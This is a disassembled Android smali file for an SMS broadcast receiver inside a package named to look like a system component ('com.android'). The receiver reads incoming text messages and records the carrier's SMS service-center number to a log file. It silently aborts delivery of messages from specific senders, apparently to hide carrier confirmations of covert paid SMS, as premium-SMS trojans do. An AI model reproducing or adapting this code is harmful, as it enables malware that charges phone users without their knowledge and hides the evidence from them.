.class public Lcom/android/MainService$SMSReceiver;
.super Landroid/content/BroadcastReceiver;
.source "MainService.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/android/MainService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "SMSReceiver"
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/MainService;


# direct methods
.method public constructor <init>(Lcom/android/MainService;)V
    .locals 0
    .parameter

    .prologue
    .line 524
    iput-object p1, p0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 15
    .parameter "context"
    .parameter "intent"

    .prologue
    .line 527
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    .line 528
    .local v0, actionName:Ljava/lang/String;
    invoke-virtual {p0}, Lcom/android/MainService$SMSReceiver;->getResultCode()I

    move-result v9

    .line 529
    .local v9, resultCode:I
    const-string v13, "com.test.sms.send"

    invoke-virtual {v0, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-eqz v13, :cond_1

    .line 574
    .end local p1
    :cond_0
    :goto_0
    return-void

    .line 533
    .restart local p1
    :cond_1
    const-string v13, "com.test.sms.delivery"

    invoke-virtual {v0, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-nez v13, :cond_0

    .line 537
    const-string v13, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v0, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-eqz v13, :cond_0

    .line 538
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v1

    .line 539
    .local v1, bundle:Landroid/os/Bundle;
    if-eqz v1, :cond_0

    .line 540
    const-string v13, "pdus"

    invoke-virtual {v1, v13}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, [Ljava/lang/Object;

    .line 541
    .local v7, myOBJpdus:[Ljava/lang/Object;
    array-length v13, v7

    new-array v6, v13, [Landroid/telephony/gsm/SmsMessage;

    .line 542
    .local v6, messages:[Landroid/telephony/gsm/SmsMessage;
    const/4 v3, 0x0

    .end local p1
    .local v3, i:I
    :goto_1
    array-length v13, v7

    if-lt v3, v13, :cond_4

    .line 546
    const/4 v13, 0x0

    aget-object v5, v6, v13

    .line 547
    .local v5, message:Landroid/telephony/gsm/SmsMessage;
    invoke-virtual {v5}, Landroid/telephony/gsm/SmsMessage;->getServiceCenterAddress()Ljava/lang/String;

    move-result-object v12

    .line 548
    .local v12, tmpservicecenter:Ljava/lang/String;
    invoke-virtual {v5}, Landroid/telephony/gsm/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v10

    .line 550
    .local v10, showAddress:Ljava/lang/String;
    if-eqz v10, :cond_3

    const-string v13, "100"

    invoke-virtual {v10, v13}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v13

    if-eqz v13, :cond_3

    const-string v13, ""

    invoke-virtual {v13, v12}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v13

    if-nez v13, :cond_3

    const-string v13, "other"

    iget-object v14, p0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    invoke-static {v14}, Lcom/android/MainService;->access$1(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v13

    if-eqz v13, :cond_3

    .line 551
    iget-object v13, p0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    invoke-static {v13, v12}, Lcom/android/MainService;->access$2(Lcom/android/MainService;Ljava/lang/String;)V

    .line 552
    sget-object v13, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    invoke-static {v13}, Lcom/android/FileAct;->readString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 553
    .local v8, record:Ljava/lang/String;
    invoke-static {v8}, Lcom/android/StringUtil;->getRecordInfo(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 554
    .local v2, docount:[Ljava/lang/String;
    if-eqz v2, :cond_5

    array-length v13, v2

    const/4 v14, 0x3

    if-ne v13, v14, :cond_5

    .line 555
    const/4 v13, 0x2

    aget-object v11, v2, v13

    .line 556
    .local v11, smsc:Ljava/lang/String;
    const-string v13, "other"

    invoke-virtual {v13, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v13

    if-nez v13, :cond_2

    .line 557
    const-string v13, ""

    invoke-virtual {v13, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v13

    if-eqz v13, :cond_3

    .line 558
    :cond_2
    new-instance v13, Ljava/lang/StringBuilder;

    const/4 v14, 0x0

    aget-object v14, v2, v14

    invoke-static {v14}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v14

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v14, "|"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const/4 v14, 0x1

    aget-object v14, v2, v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    .line 559
    const-string v14, "|"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    iget-object v14, p0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    invoke-static {v14}, Lcom/android/MainService;->access$1(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    .line 558
    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 560
    .local v4, logtxt:Ljava/lang/String;
    sget-object v13, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    invoke-static {v4, v13}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 569
    .end local v2           #docount:[Ljava/lang/String;
    .end local v4           #logtxt:Ljava/lang/String;
    .end local v8           #record:Ljava/lang/String;
    .end local v11           #smsc:Ljava/lang/String;
    :cond_3
    :goto_2
    if-eqz v10, :cond_0

    iget-object v13, p0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    invoke-static {v13}, Lcom/android/MainService;->access$4(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v10, v13}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v13

    if-eqz v13, :cond_0

    iget-object v13, p0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    invoke-static {v13}, Lcom/android/MainService;->access$5(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v10, v13}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v13

    if-nez v13, :cond_0

    .line 570
    invoke-virtual {p0}, Lcom/android/MainService$SMSReceiver;->abortBroadcast()V

    goto/16 :goto_0

    .line 544
    .end local v5           #message:Landroid/telephony/gsm/SmsMessage;
    .end local v10           #showAddress:Ljava/lang/String;
    .end local v12           #tmpservicecenter:Ljava/lang/String;
    :cond_4
    aget-object p1, v7, v3

    check-cast p1, [B

    invoke-static/range {p1 .. p1}, Landroid/telephony/gsm/SmsMessage;->createFromPdu([B)Landroid/telephony/gsm/SmsMessage;

    move-result-object v13

    .line 543
    aput-object v13, v6, v3

    .line 542
    add-int/lit8 v3, v3, 0x1

    goto/16 :goto_1

    .line 563
    .restart local v2       #docount:[Ljava/lang/String;
    .restart local v5       #message:Landroid/telephony/gsm/SmsMessage;
    .restart local v8       #record:Ljava/lang/String;
    .restart local v10       #showAddress:Ljava/lang/String;
    .restart local v12       #tmpservicecenter:Ljava/lang/String;
    :cond_5
    new-instance v13, Ljava/lang/StringBuilder;

    invoke-static {}, Lcom/android/StringUtil;->getExecTime()Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v14

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v14, "|"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    .line 564
    iget-object v14, p0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    invoke-static {v14}, Lcom/android/MainService;->access$3(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, "|"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    iget-object v14, p0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    invoke-static {v14}, Lcom/android/MainService;->access$1(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    .line 563
    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 565
    .restart local v4       #logtxt:Ljava/lang/String;
    sget-object v13, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    invoke-static {v4, v13}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_2
.end method
